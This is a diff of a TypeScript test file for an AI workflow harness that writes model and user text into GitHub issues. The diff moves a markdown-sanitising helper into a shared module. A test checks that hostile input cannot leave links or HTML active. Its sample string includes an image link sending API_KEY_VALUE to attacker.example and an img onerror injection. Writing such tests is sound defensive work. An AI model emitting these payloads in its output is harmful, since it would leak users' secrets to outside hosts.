@@ -3,6 +3,7 @@ import assert from "node:assert/strict";
 import { issueSectionVariants, parseIssueBody, renderIssueSection, withIssueSection, SECTION_START, SECTION_END } from "../src/harness/issue-section.ts";
 import { createWorkflow } from "../src/harness/state.ts";
 import type { Workflow } from "../src/harness/model.ts";
+import { ACTIVE, outsideCode } from "./helpers/markdown.ts";
 
 const block = (content: string) => `${SECTION_START}\n${content}\n${SECTION_END}`;
 
@@ -101,23 +102,6 @@ test("hostile content cannot break the table, the block or the markers", () => {
 	assert.doesNotMatch(section, /<script>|^# título/m); assert.match(section, /&lt;script&gt;/);
 });
 
-// Lo que GitHub deja activo fuera del código: links, imágenes, autolinks, HTML, menciones y referencias.
-// Un code span es lo que va entre dos rachas de backticks del mismo largo, sin escapes adentro (CommonMark);
-// un carácter escapado con \ es literal.
-function outsideCode(line: string): string {
-	let rest = ""; let i = 0;
-	while (i < line.length) {
-		if (line[i] === "\\") { rest += "·"; i += 2; continue; }
-		const run = /^`+/.exec(line.slice(i))?.[0];
-		if (!run) { rest += line[i]; i++; continue; }
-		const close = new RegExp(`(?<!\`)${run}(?!\`)`, "g"); close.lastIndex = i + run.length;
-		const end = close.exec(line);
-		if (!end) { rest += run; i += run.length; continue; }
-		rest += " "; i = end.index + run.length;
-	}
-	return rest;
-}
-const ACTIVE = [/[[\]]/, /`/, /:\/\//, /www\./i, /@/, /#\d/, /gh-\d/i, /<(?!br>)/];
 test("text from the model, a command or the person cannot leave links, images, autolinks, HTML or mentions active", () => {
 	const hostile = "![x](https://attacker.example/c?d=API_KEY_VALUE) [click](https://attacker.example) <https://a.example> https://b.example/x?y=1 www.c.example ana@example.com @octocat @org/team <img src=x onerror=y> [r][ref] [^1] owner/repo#12 GH-7 x` @user `y \\`@z` fin\\";
 	const w = working(); w.recipe!.objective = hostile; w.recipe!.approach = hostile; w.recipe!.scope = [hostile]; w.recipe!.cases[0]!.description = hostile;
